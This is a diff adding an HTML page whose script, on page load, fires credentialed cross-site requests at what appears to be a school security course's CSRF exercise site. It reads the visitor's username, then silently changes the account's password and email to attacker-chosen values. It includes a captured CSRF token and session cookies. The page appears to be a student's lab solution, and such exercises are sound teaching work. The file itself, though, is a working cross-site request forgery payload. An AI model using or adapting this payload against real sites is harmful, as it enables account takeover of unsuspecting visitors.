@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script>
+        const newPassword = 'Pa$$w0rd'
+        const newEmail = 'pwnd@gibz.ch'
+
+        window.onload = () => {
+            fetch("https://m183.gibz-informatik.ch/api/csrf/getUsername", {
+                credentials: 'include'
+            }).then(res => {
+                res.text().then(username => {
+                    fetch("https://m183.gibz-informatik.ch/api/csrf/changePassword", {
+                        credentials: 'include',
+                        "headers": {
+                            "accept": "application/json, text/plain, */*",
+                            "accept-language": "en-US,en;q=0.9,de;q=0.8",
+                            "content-type": "multipart/form-data; boundary=----WebKitFormBoundarypcDkBDvB7fqlOTb0",
+                            "sec-ch-ua": "\"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\"",
+                            "sec-ch-ua-mobile": "?0",
+                            "sec-ch-ua-platform": "\"Windows\"",
+                            "sec-fetch-dest": "empty",
+                            "sec-fetch-mode": "cors",
+                            "sec-fetch-site": "same-origin",
+                            "cookie": "M183=CfDJ8KWWz-9FZ0ZLo1r4sL0b9aNMoDFwPrbSRiAi3ut8Q8g0HiXQ4gi6BfX9m1yzQIgditfgS-xHlslXX256DHmeqaOb6K4N6O8BrWkq6t8oky69aWVynx2KZ4OCWI8u-JVp1tsuGq7XyvWwEMzTEkP_sadn61hyLNZzP2c9LjyXXbQuuBYIhYDU6mdli13tf07U5DO6vIMOzrySjL_BbPqSmL0Tw_7R0K7WOcxnlT3jxQtSjQJ4iAJbyWlRgZGcRm-bhDbV0-Whocdgs6z9fXUkPkJJx49a3cSdGSAHeQt6C3yPh1wggNFKn9J4oHJQp28B2WsQ_0XbwH4wTKMDMAHPjjJ4Bs1eGAIM8f3_Nps4Pg0bqZp3WssWZT0-eQqGxbSdHkrs94dQOS64ZKxfKUZMlMnwhhnDsJqqrh5xGZ29s9P8pTarHOFsbY6X3XdBIZAOCuKZjTf1PBIRq80W7pVgWO0KTRhPMCKXtKK_kDAVgEY0"
+                        },
+                        "referrer": "https://m183.gibz-informatik.ch/csrf",
+                        "referrerPolicy": "strict-origin-when-cross-origin",
+                        "body": `------WebKitFormBoundarypcDkBDvB7fqlOTb0\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n${username}\r\n------WebKitFormBoundarypcDkBDvB7fqlOTb0\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n${newPassword}\r\n------WebKitFormBoundarypcDkBDvB7fqlOTb0--\r\n`,
+                        "method": "POST",
+                        "mode": "cors"
+                    }).then(console.log)
+                })
+            }).catch(console.log)
+
+
+
+            fetch("https://m183.gibz-informatik.ch/api/csrf/changeEmail", {
+                credentials: 'include',
+                "headers": {
+                    "accept": "application/json, text/plain, */*",
+                    "accept-language": "en-US,en;q=0.9,de;q=0.8",
+                    "content-type": "application/json;charset=UTF-8",
+                    "sec-ch-ua": "\"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\"",
+                    "sec-ch-ua-mobile": "?0",
+                    "sec-ch-ua-platform": "\"Windows\"",
+                    "sec-fetch-dest": "empty",
+                    "sec-fetch-mode": "cors",
+                    "sec-fetch-site": "same-origin",
+                    "cookie": "M183=CfDJ8KWWz-9FZ0ZLo1r4sL0b9aO5rc7O--2TvOyKS9K6Td38xBX5nVzijs58f55npEwdWGHpiIF8mjXYS3Pl7S1KrdoF7TyZW2Kl2WtDJVrsgcp_jgQ6zkNj__2Lt-_2wLk2V9Gp4617FbmWZiEq65DjcxswlLY6o1yjisfNPPMYNbKWdD71ka6KHXErVP41Hp1XXnygQHxq2QE67jnxIUqXgihH8ypGoN7QeZAA3GPkqQB95QTHrJ_Z3i3i8nYBnAK2G8H644a9QA_ilDr1N9b9XXYpCtFrNEXdYCvL1aK8EXlhV3L9RNZATIOKXjTo-qCYbKTXZnNzZOznkPLgMGUW_pNZgSMfSkHiX2eMQOKHqi9ZZos4PU1Vrdu88bIOt1IxMIvNAru8mSDMXO2Xwny3BcTpMWtoJoTvsxtq9ZaRlAUO6wFj2eqmFEPT6hzHbR0AEOEXUOlh9kUxz03xCtK76z17wboiP0HPe4t4f5s6hJKW"
+                },
+                "referrer": "https://m183.gibz-informatik.ch/csrf",
+                "referrerPolicy": "strict-origin-when-cross-origin",
+                "body": `{\"csrf\":\"c75d3f1f5bcd6914d033\",\"email\":\"${newEmail}\"}`,
+                "method": "POST",
+                "mode": "cors"
+            });
+        }
+    </script>
+</head>
+
+<body>
+    Das war keine gute Idee
+</body>
+
+</html>
